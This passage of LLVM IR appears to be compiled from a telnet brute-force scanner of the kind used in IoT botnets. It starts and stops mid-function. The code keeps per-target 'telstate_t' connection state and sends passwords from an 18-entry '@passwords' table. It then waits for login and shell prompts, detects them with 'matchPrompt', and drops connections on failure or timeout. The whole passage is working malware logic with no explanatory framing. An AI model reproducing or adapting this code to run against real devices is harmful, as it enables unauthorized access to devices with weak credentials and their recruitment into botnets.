  %834 = load i8*, i8** %833, align 8
  %835 = call i8* @strstr(i8* %834, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %836 = icmp ne i8* %835, null
  br i1 %836, label %837, label %852

; <label>:837:                                    ; preds = %829
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 16
  %843 = call i32 @sclose(i32 %842)
  %844 = load i32, i32* %2, align 4
  %845 = sext i32 %844 to i64
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 2
  store i8 0, i8* %847, align 8
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 3
  store i8 0, i8* %851, align 1
  br label %1943

; <label>:852:                                    ; preds = %829
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 8
  %857 = load i8*, i8** %856, align 8
  %858 = call i8* @strstr(i8* %857, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %859 = icmp ne i8* %858, null
  br i1 %859, label %860, label %875

; <label>:860:                                    ; preds = %852
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 0
  %865 = load i32, i32* %864, align 16
  %866 = call i32 @sclose(i32 %865)
  %867 = load i32, i32* %2, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 2
  store i8 0, i8* %870, align 8
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 3
  store i8 0, i8* %874, align 1
  br label %1943

; <label>:875:                                    ; preds = %852
  %876 = load i32, i32* %2, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 8
  %880 = load i8*, i8** %879, align 8
  %881 = call i8* @strstr(i8* %880, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %882 = icmp ne i8* %881, null
  br i1 %882, label %883, label %898

; <label>:883:                                    ; preds = %875
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 0
  %888 = load i32, i32* %887, align 16
  %889 = call i32 @sclose(i32 %888)
  %890 = load i32, i32* %2, align 4
  %891 = sext i32 %890 to i64
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 2
  store i8 0, i8* %893, align 8
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 3
  store i8 0, i8* %897, align 1
  br label %1943

; <label>:898:                                    ; preds = %875
  br label %899

; <label>:899:                                    ; preds = %898
  br label %900

; <label>:900:                                    ; preds = %899
  br label %901

; <label>:901:                                    ; preds = %900
  br label %902

; <label>:902:                                    ; preds = %901
  br label %903

; <label>:903:                                    ; preds = %902
  br label %904

; <label>:904:                                    ; preds = %903
  br label %905

; <label>:905:                                    ; preds = %904
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 8
  %910 = load i8*, i8** %909, align 8
  %911 = call i64 @strlen(i8* %910) #10
  %912 = trunc i64 %911 to i16
  %913 = load i32, i32* %2, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %914
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %915, i32 0, i32 7
  store i16 %912, i16* %916, align 16
  br label %917

; <label>:917:                                    ; preds = %905
  br label %918

; <label>:918:                                    ; preds = %917
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 6
  %923 = load i32, i32* %922, align 4
  %924 = add i32 %923, 10
  %925 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %926 = icmp ult i32 %924, %925
  br i1 %926, label %927, label %942

; <label>:927:                                    ; preds = %918
  %928 = load i32, i32* %2, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 0
  %932 = load i32, i32* %931, align 16
  %933 = call i32 @sclose(i32 %932)
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 2
  store i8 0, i8* %937, align 8
  %938 = load i32, i32* %2, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 3
  store i8 1, i8* %941, align 1
  br label %942

; <label>:942:                                    ; preds = %927, %918
  br label %1942

; <label>:943:                                    ; preds = %68
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 0
  %948 = load i32, i32* %947, align 16
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 5
  %953 = load i8, i8* %952, align 1
  %954 = zext i8 %953 to i64
  %955 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %954
  %956 = load i8*, i8** %955, align 8
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 5
  %961 = load i8, i8* %960, align 1
  %962 = zext i8 %961 to i64
  %963 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %962
  %964 = load i8*, i8** %963, align 8
  %965 = call i64 @strlen(i8* %964) #10
  %966 = call i64 @send(i32 %948, i8* %956, i64 %965, i32 16384)
  %967 = icmp slt i64 %966, 0
  br i1 %967, label %968, label %983

; <label>:968:                                    ; preds = %943
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 16
  %974 = call i32 @sclose(i32 %973)
  %975 = load i32, i32* %2, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 2
  store i8 0, i8* %978, align 8
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 3
  store i8 1, i8* %982, align 1
  br label %1943

; <label>:983:                                    ; preds = %943
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 0
  %988 = load i32, i32* %987, align 16
  %989 = call i64 @send(i32 %988, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %990 = icmp slt i64 %989, 0
  br i1 %990, label %991, label %1006

; <label>:991:                                    ; preds = %983
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 16
  %997 = call i32 @sclose(i32 %996)
  %998 = load i32, i32* %2, align 4
  %999 = sext i32 %998 to i64
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %999
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1000, i32 0, i32 2
  store i8 0, i8* %1001, align 8
  %1002 = load i32, i32* %2, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 3
  store i8 1, i8* %1005, align 1
  br label %1943

; <label>:1006:                                   ; preds = %983
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 2
  store i8 6, i8* %1010, align 8
  br label %1942

; <label>:1011:                                   ; preds = %68
  %1012 = load i32, i32* %2, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 6
  %1016 = load i32, i32* %1015, align 4
  %1017 = icmp eq i32 %1016, 0
  br i1 %1017, label %1018, label %1024

; <label>:1018:                                   ; preds = %1011
  %1019 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1020 = load i32, i32* %2, align 4
  %1021 = sext i32 %1020 to i64
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1021
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1022, i32 0, i32 6
  store i32 %1019, i32* %1023, align 4
  br label %1024

; <label>:1024:                                   ; preds = %1018, %1011
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 0
  %1029 = load i32, i32* %1028, align 16
  %1030 = load i32, i32* %2, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 8
  %1034 = load i8*, i8** %1033, align 8
  %1035 = load i32, i32* %2, align 4
  %1036 = sext i32 %1035 to i64
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 7
  %1039 = load i16, i16* %1038, align 16
  %1040 = zext i16 %1039 to i32
  %1041 = call i32 @readUntil(i32 %1029, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1034, i32 1024, i32 %1040)
  %1042 = icmp ne i32 %1041, 0
  br i1 %1042, label %1043, label %1118

; <label>:1043:                                   ; preds = %1024
  %1044 = load i32, i32* %2, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 6
  store i32 0, i32* %1047, align 4
  %1048 = load i32, i32* %2, align 4
  %1049 = sext i32 %1048 to i64
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1049
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1050, i32 0, i32 7
  store i16 0, i16* %1051, align 16
  %1052 = load i32, i32* %2, align 4
  %1053 = sext i32 %1052 to i64
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 8
  %1056 = load i8*, i8** %1055, align 8
  %1057 = call i8* @strstr(i8* %1056, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1058 = icmp ne i8* %1057, null
  br i1 %1058, label %1059, label %1079

; <label>:1059:                                   ; preds = %1043
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 8
  %1064 = load i8*, i8** %1063, align 8
  call void @llvm.memset.p0i8.i64(i8* %1064, i8 0, i64 1024, i32 1, i1 false)
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 0
  %1069 = load i32, i32* %1068, align 16
  %1070 = call i32 @sclose(i32 %1069)
  %1071 = load i32, i32* %2, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 2
  store i8 0, i8* %1074, align 8
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 3
  store i8 0, i8* %1078, align 1
  br label %1943

; <label>:1079:                                   ; preds = %1043
  %1080 = load i32, i32* %2, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 8
  %1084 = load i8*, i8** %1083, align 8
  %1085 = call i32 @matchPrompt(i8* %1084)
  %1086 = icmp ne i32 %1085, 0
  br i1 %1086, label %1107, label %1087

; <label>:1087:                                   ; preds = %1079
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 8
  %1092 = load i8*, i8** %1091, align 8
  call void @llvm.memset.p0i8.i64(i8* %1092, i8 0, i64 1024, i32 1, i1 false)
  %1093 = load i32, i32* %2, align 4
  %1094 = sext i32 %1093 to i64
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 0
  %1097 = load i32, i32* %1096, align 16
  %1098 = call i32 @sclose(i32 %1097)
  %1099 = load i32, i32* %2, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 2
  store i8 0, i8* %1102, align 8
  %1103 = load i32, i32* %2, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 3
  store i8 1, i8* %1106, align 1
  br label %1943

; <label>:1107:                                   ; preds = %1079
  %1108 = load i32, i32* %2, align 4
  %1109 = sext i32 %1108 to i64
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1109
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1110, i32 0, i32 2
  store i8 7, i8* %1111, align 8
  br label %1112

; <label>:1112:                                   ; preds = %1107
  %1113 = load i32, i32* %2, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 8
  %1117 = load i8*, i8** %1116, align 8
  call void @llvm.memset.p0i8.i64(i8* %1117, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1118:                                   ; preds = %1024
  %1119 = load i32, i32* %2, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 16
  %1124 = load i32, i32* %2, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1125
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1126, i32 0, i32 8
  %1128 = load i8*, i8** %1127, align 8
  %1129 = load i32, i32* %2, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 7
  %1133 = load i16, i16* %1132, align 16
  %1134 = zext i16 %1133 to i32
  %1135 = call i32 @readUntil(i32 %1123, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1128, i32 1024, i32 %1134)
  %1136 = icmp ne i32 %1135, 0
  br i1 %1136, label %1137, label %1212

; <label>:1137:                                   ; preds = %1118
  %1138 = load i32, i32* %2, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 6
  store i32 0, i32* %1141, align 4
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 7
  store i16 0, i16* %1145, align 16
  %1146 = load i32, i32* %2, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 8
  %1150 = load i8*, i8** %1149, align 8
  %1151 = call i8* @strstr(i8* %1150, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1152 = icmp ne i8* %1151, null
  br i1 %1152, label %1153, label %1173

; <label>:1153:                                   ; preds = %1137
  %1154 = load i32, i32* %2, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 8
  %1158 = load i8*, i8** %1157, align 8
  call void @llvm.memset.p0i8.i64(i8* %1158, i8 0, i64 1024, i32 1, i1 false)
  %1159 = load i32, i32* %2, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 0
  %1163 = load i32, i32* %1162, align 16
  %1164 = call i32 @sclose(i32 %1163)
  %1165 = load i32, i32* %2, align 4
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 2
  store i8 0, i8* %1168, align 8
  %1169 = load i32, i32* %2, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 3
  store i8 0, i8* %1172, align 1
  br label %1943

; <label>:1173:                                   ; preds = %1137
  %1174 = load i32, i32* %2, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 8
  %1178 = load i8*, i8** %1177, align 8
  %1179 = call i32 @matchPrompt(i8* %1178)
  %1180 = icmp ne i32 %1179, 0
  br i1 %1180, label %1201, label %1181

; <label>:1181:                                   ; preds = %1173
  %1182 = load i32, i32* %2, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 8
  %1186 = load i8*, i8** %1185, align 8
  call void @llvm.memset.p0i8.i64(i8* %1186, i8 0, i64 1024, i32 1, i1 false)
  %1187 = load i32, i32* %2, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 0
  %1191 = load i32, i32* %1190, align 16
  %1192 = call i32 @sclose(i32 %1191)
  %1193 = load i32, i32* %2, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 2
  store i8 0, i8* %1196, align 8
  %1197 = load i32, i32* %2, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 3
  store i8 1, i8* %1200, align 1
  br label %1943

; <label>:1201:                                   ; preds = %1173
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 2
  store i8 7, i8* %1205, align 8
  br label %1206

; <label>:1206:                                   ; preds = %1201
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 8
  %1211 = load i8*, i8** %1210, align 8
  call void @llvm.memset.p0i8.i64(i8* %1211, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1212:                                   ; preds = %1118
  %1213 = load i32, i32* %2, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 0
  %1217 = load i32, i32* %1216, align 16
  %1218 = load i32, i32* %2, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 8
  %1222 = load i8*, i8** %1221, align 8
  %1223 = load i32, i32* %2, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 7
  %1227 = load i16, i16* %1226, align 16
  %1228 = zext i16 %1227 to i32
  %1229 = call i32 @readUntil(i32 %1217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1222, i32 1024, i32 %1228)
  %1230 = icmp ne i32 %1229, 0
  br i1 %1230, label %1231, label %1306

; <label>:1231:                                   ; preds = %1212
  %1232 = load i32, i32* %2, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 6
  store i32 0, i32* %1235, align 4
  %1236 = load i32, i32* %2, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 7
  store i16 0, i16* %1239, align 16
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 8
  %1244 = load i8*, i8** %1243, align 8
  %1245 = call i8* @strstr(i8* %1244, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1246 = icmp ne i8* %1245, null
  br i1 %1246, label %1247, label %1267

; <label>:1247:                                   ; preds = %1231
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 8
  %1252 = load i8*, i8** %1251, align 8
  call void @llvm.memset.p0i8.i64(i8* %1252, i8 0, i64 1024, i32 1, i1 false)
  %1253 = load i32, i32* %2, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 0
  %1257 = load i32, i32* %1256, align 16
  %1258 = call i32 @sclose(i32 %1257)
  %1259 = load i32, i32* %2, align 4
  %1260 = sext i32 %1259 to i64
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1260
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1261, i32 0, i32 2
  store i8 0, i8* %1262, align 8
  %1263 = load i32, i32* %2, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 3
  store i8 0, i8* %1266, align 1
  br label %1943

; <label>:1267:                                   ; preds = %1231
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 8
  %1272 = load i8*, i8** %1271, align 8
  %1273 = call i32 @matchPrompt(i8* %1272)
  %1274 = icmp ne i32 %1273, 0
  br i1 %1274, label %1295, label %1275

; <label>:1275:                                   ; preds = %1267
  %1276 = load i32, i32* %2, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 8
  %1280 = load i8*, i8** %1279, align 8
  call void @llvm.memset.p0i8.i64(i8* %1280, i8 0, i64 1024, i32 1, i1 false)
